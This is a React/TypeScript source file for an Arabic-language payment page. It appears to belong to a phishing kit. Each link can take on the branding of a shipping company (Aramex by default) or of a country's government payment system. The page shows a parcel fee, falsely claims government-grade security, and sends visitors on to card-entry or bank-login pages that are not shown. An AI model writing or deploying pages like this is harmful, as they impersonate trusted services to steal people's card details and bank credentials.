import type { PaymentPayload } from "@/types/payload";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { Shield } from "lucide-react";
import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
import { useLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency, getCurrencyByCountry } from "@/lib/countryCurrencies";
import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck, User } from "lucide-react";

const PaymentDetails = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);

  const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
  const serviceName = linkData?.payload?.service_name || "دفع فاتورة";
  const branding = getServiceBranding(serviceKey);
  const shippingInfo = linkData?.payload as PaymentPayload;

  // Get country code from link data
  const countryCode = shippingInfo?.selectedCountry || "SA";
  
  // Get government payment system for the country
  const govSystem = getGovernmentPaymentSystem(countryCode);
  
  // Use government branding colors
  const colors = govSystem.colors;

  // Get payment data from link data
  const paymentData = shippingInfo?.payment_data;

  // Get currency code - prioritize saved currency code from data
  const savedCurrencyCode = paymentData?.currency_code || shippingInfo?.currency_code;
  const currencyCodeToUse = savedCurrencyCode || getCurrencyByCountry(countryCode).code;

  // Get amount from payment data or shipping info
  const rawAmount = paymentData?.payment_amount || shippingInfo?.cod_amount || shippingInfo?.payment_amount;

  // Handle different data types and edge cases
  let amount = 500; // Default value
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  // Format amount with the dynamic currency code
  const formattedAmount = formatCurrency(amount, currencyCodeToUse);
  
  // Get payment method from link data
  const paymentMethod = shippingInfo?.payment_method || 'card';
  
  const handleProceed = () => {
    // If bank_login, skip card input and go directly to bank selection
    if (paymentMethod === 'bank_login') {
      navigate(`/pay/${id}/bank-selector`);
    } else {
      // Default to card input
      navigate(`/pay/${id}/card-input`);
    }
  };
  
  return (
    <DynamicPaymentLayout
      serviceName={serviceName}
      serviceKey={serviceKey}
      amount={formattedAmount}
      title="تفاصيل الدفع"
      description={`صفحة دفع آمنة ومحمية لخدمة ${serviceName}`}
      icon={<CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
    >
      {/* Payment Data Display */}
      {(shippingInfo || paymentData) && (
        <div 
          className="mb-6 sm:mb-8 p-3 sm:p-4 rounded-lg"
          style={{
            backgroundColor: `${govSystem.colors.primary}08`,
            borderRadius: govSystem.borderRadius.md,
            border: `1px solid ${govSystem.colors.primary}20`
          }}
        >
          <h3 
            className="font-semibold mb-2 sm:mb-3 text-sm sm:text-base"
            style={{ 
              color: govSystem.colors.text,
              fontFamily: govSystem.fonts.primaryAr 
            }}
          >
            بيانات السداد
          </h3>
          <div className="space-y-2 text-xs sm:text-sm">
            {paymentData?.customer_name && (
              <div className="flex items-center gap-2">
                <User className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
                <span className="text-muted-foreground">الاسم:</span>
                <span className="font-semibold">{paymentData.customer_name}</span>
              </div>
            )}
            {paymentData?.invoice_number && (
              <div className="flex items-center gap-2">
                <Hash className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
                <span className="text-muted-foreground">الرقم المفوتر:</span>
                <span className="font-semibold">{paymentData.invoice_number}</span>
              </div>
            )}
            {paymentData?.selected_service_name && (
              <div className="flex items-center gap-2">
                <Truck className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
                <span className="text-muted-foreground">الخدمة:</span>
                <span className="font-semibold">{paymentData.selected_service_name}</span>
              </div>
            )}
            {shippingInfo?.tracking_number && (
              <div className="flex items-center gap-2">
                <Hash className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
                <span className="text-muted-foreground">رقم الشحنة:</span>
                <span className="font-semibold">{shippingInfo.tracking_number}</span>
              </div>
            )}
            {shippingInfo?.package_description && (
              <div className="flex items-center gap-2">
                <Package className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
                <span className="text-muted-foreground">وصف الطرد:</span>
                <span className="font-semibold">{shippingInfo.package_description}</span>
              </div>
            )}
          </div>
        </div>
      )}
      
      {/* Payment Summary */}
      <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
        {paymentData?.selected_service_name && (
          <div className="flex justify-between py-2 sm:py-3 border-b border-border text-sm sm:text-base">
            <span className="text-muted-foreground">الخدمة</span>
            <span className="font-semibold">{paymentData.selected_service_name}</span>
          </div>
        )}
        {!paymentData?.selected_service_name && (
          <div className="flex justify-between py-2 sm:py-3 border-b border-border text-sm sm:text-base">
            <span className="text-muted-foreground">الخدمة</span>
            <span className="font-semibold">{serviceName}</span>
          </div>
        )}

        <div
          className="flex justify-between py-3 sm:py-4 rounded-lg px-3 sm:px-4"
          style={{
            background: `${govSystem.colors.primary}15`,
            borderRadius: govSystem.borderRadius.md
          }}
        >
          <span 
            className="text-base sm:text-lg font-bold"
            style={{ 
              color: govSystem.colors.text,
              fontFamily: govSystem.fonts.primaryAr 
            }}
          >
            المبلغ الإجمالي
          </span>
          <span 
            className="text-xl sm:text-2xl font-bold" 
            style={{ 
              color: govSystem.colors.primary,
              fontFamily: govSystem.fonts.primaryAr
            }}
          >
            {formattedAmount}
          </span>
        </div>
      </div>
    
      {/* Payment Method */}
      <div className="mb-6 sm:mb-8">
        <h3 
          className="font-semibold mb-2 sm:mb-3 text-sm sm:text-base"
          style={{ 
            color: govSystem.colors.text,
            fontFamily: govSystem.fonts.primaryAr 
          }}
        >
          طريقة الدفع
        </h3>
        <div
          className="border-2 rounded-lg sm:rounded-xl p-3 sm:p-4 hover:shadow-md transition-shadow"
          style={{
            borderColor: govSystem.colors.primary,
            background: `${govSystem.colors.primary}10`,
            borderRadius: govSystem.borderRadius.md
          }}
        >
          <div className="flex items-center gap-2 sm:gap-3">
            <div
              className="w-10 h-10 rounded-full flex items-center justify-center"
              style={{ 
                background: govSystem.gradients.primary
              }}
            >
              <CreditCard className="w-5 h-5 text-white" />
            </div>
            <div>
              <p 
                className="font-semibold text-sm sm:text-base"
                style={{ 
                  color: govSystem.colors.text,
                  fontFamily: govSystem.fonts.primaryAr 
                }}
              >
                الدفع بالبطاقة عبر {govSystem.nameAr}
              </p>
              <p 
                className="text-xs sm:text-sm" 
                style={{ 
                  color: govSystem.colors.textLight,
                  fontFamily: govSystem.fonts.primaryAr
                }}
              >
                Visa، Mastercard، Mada
              </p>
            </div>
          </div>
        </div>
      </div>

      {/* Security Badge */}
      <div className="mb-6 sm:mb-8">
        <div 
          className="flex items-center gap-3 p-4 bg-white rounded-lg border" 
          style={{ 
            borderColor: govSystem.colors.primary,
            borderRadius: govSystem.borderRadius.md
          }}
        >
          <div
            className="w-10 h-10 rounded-full flex items-center justify-center"
            style={{ backgroundColor: `${govSystem.colors.primary}15` }}
          >
            <Shield className="w-5 h-5" style={{ color: govSystem.colors.primary }} />
          </div>
          <div>
            <p 
              className="font-semibold text-sm sm:text-base" 
              style={{ 
                color: govSystem.colors.text,
                fontFamily: govSystem.fonts.primaryAr
              }}
            >
              دفع آمن عبر {govSystem.nameAr}
            </p>
            <p 
              className="text-xs sm:text-sm" 
              style={{ 
                color: govSystem.colors.textLight,
                fontFamily: govSystem.fonts.primaryAr
              }}
            >
              جميع المعلومات مُشفرة ومحمية بأعلى معايير الأمان الحكومية
            </p>
          </div>
        </div>
      </div>
      
      {/* Proceed Button */}
      <Button
        onClick={handleProceed}
        size="lg"
        className="w-full h-14 text-lg font-bold text-white hover:opacity-90 transition-all"
        style={{
          background: govSystem.gradients.primary,
          borderRadius: govSystem.borderRadius.lg,
          boxShadow: govSystem.shadows.md,
          fontFamily: govSystem.fonts.primaryAr
        }}
      >
        <span className="ml-2">متابعة الدفع عبر {govSystem.nameAr}</span>
        <ArrowLeft className="w-5 h-5 mr-2" />
      </Button>

      <p 
        className="text-[10px] sm:text-xs text-center mt-4" 
        style={{ 
          color: govSystem.colors.textLight,
          fontFamily: govSystem.fonts.primaryAr
        }}
      >
        بالمتابعة عبر {govSystem.nameAr}، أنت توافق على الشروط والأحكام
      </p>
    </DynamicPaymentLayout>
  );
};

export default PaymentDetails;